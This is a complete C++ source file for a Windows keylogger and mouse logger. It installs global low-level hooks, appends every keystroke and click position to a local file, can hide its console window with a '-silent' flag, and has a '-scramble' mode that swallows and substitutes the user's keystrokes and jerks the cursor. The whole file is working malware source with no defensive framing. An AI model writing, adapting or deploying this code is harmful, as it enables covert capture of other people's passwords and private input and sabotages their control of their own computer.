#include <Windows.h>
#include <iostream>
#include <fstream>

using namespace std;

HINSTANCE hInstance = GetModuleHandle(NULL);

HHOOK mouseHook;
HHOOK keyboardHook;

BOOL scramble = FALSE;

ofstream file;

void output(const char* out)
{
	cout << out << endl;
	file << out << endl;
	return;
}

void output(char out)
{
	cout << out << endl;
	file << out << endl;
	return;
}

LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PMOUSEHOOKSTRUCT p = (PMOUSEHOOKSTRUCT)lParam;
	if (wParam == WM_LBUTTONDOWN && nCode >= 0)
	{
		file << "Left Button was clicked at position x: " << p->pt.x << " y: " << p->pt.y << endl;
		if (scramble && p->dwExtraInfo != 1)
		{
			INPUT in = { 0 };
			in.type = INPUT_MOUSE;
			in.mi.dx = -200;
			in.mi.dy = -200;
			in.mi.dwExtraInfo = 1;
			in.mi.dwFlags = MOUSEEVENTF_MOVE;

			SendInput(1, &in, sizeof(in));
		}
	}
	if (wParam == WM_RBUTTONDOWN && nCode >= 0)
	{
		file << "Right Button was clicked at position x: " << p->pt.x << " y: " << p->pt.y << endl;
		if (scramble && p->dwExtraInfo != 1)
		{
			INPUT in = { 0 };
			in.type = INPUT_MOUSE;
			in.mi.dx = 200;
			in.mi.dy = 200;
			in.mi.dwExtraInfo = 1;
			in.mi.dwFlags = MOUSEEVENTF_MOVE;

			SendInput(1, &in, sizeof(in));
		}
	}
	
	return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

DWORD WINAPI mouseLogger(LPVOID lpParm)
{
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, hInstance, NULL);
	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(mouseHook);
	return 0;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN && nCode >= 0)
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		if (p->dwExtraInfo == 0)
		{
			switch (p->vkCode)
			{
			case 0x08: output("BACKSPACE"); break;
			case 0x09: output("TAB"); break;
			case 0x0D: output("ENTER"); break;
			case 0x13: output("PAUSE"); break;
			case 0x14: output("CAPS LOCK"); scramble ? scramble = FALSE : scramble = TRUE; break;
			case 0x1B: output("ESC"); break;
			case 0x20: output("SPACEBAR"); break;
			case 0x21: output("PAGE UP"); break;
			case 0x22: output("PAGE DOWN"); break;
			case 0x23: output("END"); break;
			case 0x24: output("HOME"); break;
			case 0x25: output("LEFT ARROW"); break;
			case 0x26: output("UP ARROW"); break;
			case 0x27: output("RIGHT ARROW"); break;
			case 0x28: output("DOWN ARROW"); break;
			case 0x2C: output("PRINT SCREEN"); break;
			case 0x2D: output("INS"); break;
			case 0x2E: output("DEL"); break;
			case 0x5B: output("LWIN"); break;
			case 0x5C: output("RWIN"); break;
			case 0x5D: output("MENU"); break;
			case 0x60: output("NUM_0"); break;
			case 0x61: output("NUM_1"); break;
			case 0x62: output("NUM_2"); break;
			case 0x63: output("NUM_3"); break;
			case 0x64: output("NUM_4"); break;
			case 0x65: output("NUM_5"); break;
			case 0x66: output("NUM_6"); break;
			case 0x67: output("NUM_7"); break;
			case 0x68: output("NUM_8"); break;
			case 0x69: output("NUM_9"); break;
			case 0x6A: output("NUM_MULTIPLY"); break;
			case 0x6B: output("NUM_ADD"); break;
			case 0x6D: output("NUM_SUBTRACT"); break;
			case 0x6E: output("NUM_DECIMAL"); break;
			case 0x6F: output("NUM_DIVIDE"); break;
			case 0x70: output("F1"); break;
			case 0x71: output("F2"); break;
			case 0x72: output("F3"); break;
			case 0x73: output("F4"); break;
			case 0x74: output("F5"); break;
			case 0x75: output("F6"); break;
			case 0x76: output("F7"); break;
			case 0x77: output("F8"); break;
			case 0x78: output("F9"); break;
			case 0x79: output("F10"); break;
			case 0x7A: output("F11"); break;
			case 0x7B: output("F12"); break;
			case 0x90: output("NUM LOCK"); break;
			case 0x91: output("SCROLL LOCK"); break;
			case 0xA0: output("LSHIFT"); break;
			case 0xA1: output("RSHIFT"); break;
			case 0xA2: output("LCTRL"); break;
			case 0xA3: output("RCTRL"); break;
			case 0xA4: output("LALT"); break;
			case 0xA5: output("RALT"); break;
			case 0xBA: output(";"); break;
			case 0xBB: output("+"); break;
			case 0xBC: output(","); break;
			case 0xBD: output("-"); break;
			case 0xBE: output("."); break;
			case 0xBF: output("/"); break;
			case 0xC0: output("~"); break;
			case 0xDB: output("["); break;
			case 0xDC: output("\\"); break;
			case 0xDD: output("]"); break;
			case 0xDE: output("'"); break;
			default: output((char)p->vkCode); break;
			}

			if (scramble && p->vkCode != 0x14)
			{
				INPUT in = { 0 };
				in.type = INPUT_KEYBOARD;
				in.ki.dwExtraInfo = 1;
				in.ki.wVk = p->vkCode + 1;
				in.ki.dwFlags = KEYEVENTF_EXTENDEDKEY;

				SendInput(1, &in, sizeof(in));

				in.type = INPUT_KEYBOARD;
				in.ki.dwExtraInfo = 1;
				in.ki.wVk = p->vkCode + 1;
				in.ki.dwFlags = KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP;

				SendInput(1, &in, sizeof(in));
				
				return 1;
			}
		}
	}

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI keyboardLogger(LPVOID lpParm)
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, NULL);
	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(keyboardHook);
	return 0;
}

int main(int argc, char** argv)
{	
	if (argc > 1)
	{
		for (int i = 1; i < argc; i++)
		{
			if (!strcmp(argv[i], "-silent"))
			{
				ShowWindow(GetConsoleWindow(), SW_HIDE);
			}
			if (!strcmp(argv[i], "-scramble"))
			{
				scramble = true;
			}
		}
	}

	file.open("out.txt", ios_base::app);
	if (!file.is_open())
	{
		cout << "Failed to open text file" << endl;
		system("Pause");
		return 0;
	}

	HANDLE hMouseThread;
	DWORD dwMouseThread;

	HANDLE hKeyboardThread;
	DWORD dwKeyboardThread;

	hMouseThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)mouseLogger, NULL, NULL, &dwMouseThread);
	hKeyboardThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)keyboardLogger, NULL, NULL, &dwKeyboardThread);

	if (hMouseThread && hKeyboardThread)
	{
		return WaitForSingleObject(hMouseThread, INFINITE);
	}
	else
	{
		cout << "Failed to create thread" << endl;
	}

	system("Pause");
	return 0;
}